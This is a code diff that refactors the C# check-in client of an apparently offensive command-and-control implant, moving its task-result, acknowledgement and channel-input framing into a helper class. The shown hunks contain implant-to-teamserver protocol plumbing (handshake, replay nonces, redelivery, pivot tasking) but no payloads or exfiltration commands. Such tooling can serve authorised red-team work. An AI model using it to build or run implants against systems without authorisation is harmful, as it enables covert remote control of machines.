@@ -232,20 +232,6 @@ internal sealed class Beacon : ICheckInClient
         return CheckInExit.Terminate;
     }
 
-    // What one connect-handshake-task cycle produced, driving the reconnect
-    // policy in RunAsync.
-    private enum BeaconCycleResult
-    {
-        // The cycle never reached a handshake (a transport drop); retry.
-        Dropped,
-
-        // The handshake succeeded and the stream ran; reset the failure counter.
-        Handshaken,
-
-        // The server refused the handshake permanently; the caller terminates.
-        Terminal,
-    }
-
     // One connect-handshake-task cycle. Returns how the cycle ended so the
     // caller can distinguish a transport drop (retry) from a handshake refusal
     // (permanent). Throws on transport errors, which the caller logs and
@@ -276,29 +262,11 @@ internal sealed class Beacon : ICheckInClient
         var client = new WireBeacon.BeaconClient(channel);
         using var call = client.CheckIn(cancellationToken: cancellationToken);
 
-        // The implant speaks first: handshake with its protocol version and identity.
-        // The advertised capability set is the baked class verbs intersected with
-        // the compiled handlers (architecture.md Sec 5.3), so the teamserver only
-        // ever dispatches verbs this binary can run -- never an advertised verb
-        // with no handler behind it.
-        var handshake = new HandshakeRequest
-        {
-            Version = new ProtocolVersion { Major = 1, Minor = 0 },
-            ImplantId = _implantId,
-            // Advertise the replay-nonce arm (architecture.md Sec 9): when the
-            // server echoes it, every dispatched task carries a per-implant
-            // monotonic nonce covered by the signature, and tasking without
-            // one is refused. A server that does not echo keeps the nonce-less
-            // shape, and verification falls back to the original tuple.
-            ReplayNonces = true,
-            // Advertise the receive-ack arm (architecture.md Sec 10.3): when
-            // the server echoes it, every parsed task is acked before it
-            // executes, and a stream that dies before the ack makes the
-            // server redeliver. A server that does not echo keeps today's
-            // dispatch semantics -- no acks sent, nothing re-delivered.
-            TaskAcks = true,
-        };
-        handshake.Capabilities.Add(_handlers.AdvertisedVerbs(_classVerbs));
+        // The implant speaks first: handshake with its protocol version and
+        // identity. The advertised capability set is the baked class verbs
+        // intersected with the compiled handlers (architecture.md Sec 5.3),
+        // and both negotiation arms ride it (Sec 9, Sec 10.3).
+        var handshake = BeaconFrames.Handshake(_implantId, _handlers.AdvertisedVerbs(_classVerbs));
         await call.RequestStream.WriteAsync(new Frame { Payload = ByteString.CopyFrom(handshake.ToByteArray()) });
 
         if (!await call.ResponseStream.MoveNext(cancellationToken))
@@ -348,7 +316,7 @@ internal sealed class Beacon : ICheckInClient
         {
             await WriteFrameAsync(
                 call, writeGate,
-                ResultFrame(remembered.TaskId, remembered.Outcome, remembered.Output),
+                BeaconFrames.ResultFrame(remembered.TaskId, remembered.Outcome, remembered.Output),
                 cancellationToken);
             _held.MarkDelivered(remembered.TaskId);
         }
@@ -365,7 +333,7 @@ internal sealed class Beacon : ICheckInClient
                 // or a staged chunk run this implant demanded.
                 if (frame.Kind == FrameKind.ChannelInput)
                 {
-                    RouteChannelInput(frame, liveChannels);
+                    BeaconFrames.RouteChannelInput(frame, liveChannels, _log);
                     continue;
                 }
 
@@ -376,7 +344,7 @@ internal sealed class Beacon : ICheckInClient
                 // runs -- including a task the verifier below will refuse,
                 // because a refused task is still a delivered one.
                 if (acks)
-                    await WriteFrameAsync(call, writeGate, AckFrame(task.TaskId), cancellationToken);
+                    await WriteFrameAsync(call, writeGate, BeaconFrames.AckFrame(task.TaskId), cancellationToken);
 
                 // Fronted tasking (architecture.md Sec 5.2): a frame marked
                 // with another implant's id is a Pivot child's tasking this
@@ -575,30 +543,6 @@ internal sealed class Beacon : ICheckInClient
         }
     }
 
-    private static Frame ResultFrame(TaskRequest task, TaskOutcome outcome, string output)
-        => ResultFrame(task.TaskId, outcome, output);
-
-    private static Frame ResultFrame(string taskId, TaskOutcome outcome, string output)
-        => new()
-        {
-            Payload = ByteString.CopyFrom(new TaskResult
-            {
-                TaskId = taskId,
-                Outcome = outcome,
-                Output = output,
-            }.ToByteArray()),
-            Kind = FrameKind.TaskResult,
-        };
-
-    // The receive-ack frame (architecture.md Sec 10.3): delivery evidence for
-    // one parsed task, sent before anything executes.
-    private static Frame AckFrame(string taskId)
-        => new()
-        {
-            Payload = ByteString.CopyFrom(new TaskAck { TaskId = taskId }.ToByteArray()),
-            Kind = FrameKind.TaskAck,
-        };
-
     // Writes one task result and caches it in the held-task ledger: the cache
     // is what a redelivery re-sends, and the delivery mark is what a dying
     // stream clears so the next connection re-sends it (first-wins
@@ -611,7 +555,7 @@ internal sealed class Beacon : ICheckInClient
         string output,
         CancellationToken cancellationToken)
     {
-        await WriteFrameAsync(call, writeGate, ResultFrame(taskId, outcome, output), cancellationToken);
+        await WriteFrameAsync(call, writeGate, BeaconFrames.ResultFrame(taskId, outcome, output), cancellationToken);
         _held.Remember(taskId, outcome, output);
         _held.MarkDelivered(taskId);
     }
@@ -652,7 +596,7 @@ internal sealed class Beacon : ICheckInClient
         try
         {
             var (outcome, output) = await handler.Handle(task.Arguments, channel, lifetime);
-            await WriteFrameAsync(call, writeGate, ResultFrame(task, outcome, output), CancellationToken.None);
+            await WriteFrameAsync(call, writeGate, BeaconFrames.ResultFrame(task, outcome, output), CancellationToken.None);
             _held.Remember(task.TaskId, outcome, output);
             _held.MarkDelivered(task.TaskId);
             _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
@@ -665,34 +609,6 @@ internal sealed class Beacon : ICheckInClient
         {
             liveChannels.TryRemove(task.TaskId, out _);
             channel.CompleteInput();
-        }
-    }
-
-    // One ChannelInput frame: operator input for a live channel, routed by
-    // task id. Input for a task with no live channel is dropped and logged --
-    // a channel that already ended, or input that raced the stream.
-    private void RouteChannelInput(
-        Frame frame,
-        ConcurrentDictionary<string, BeaconLiveChannel> liveChannels)
-    {
-        ChannelInput input;
-        try
-        {
-            input = ChannelInput.Parser.ParseFrom(frame.Payload);
-        }
-        catch (Google.Protobuf.InvalidProtocolBufferException)
-        {
-            return;
-        }
-
-        if (liveChannels.TryGetValue(input.TaskId, out var channel))
-        {
-            if (!channel.Receive(input.Data.ToArray(), input.Eof))
-                _log.WriteLine($"channel input for task {input.TaskId} dropped: input queue full");
-        }
-        else
-        {
-            _log.WriteLine($"channel input for unknown task {input.TaskId} dropped");
         }
     }
 
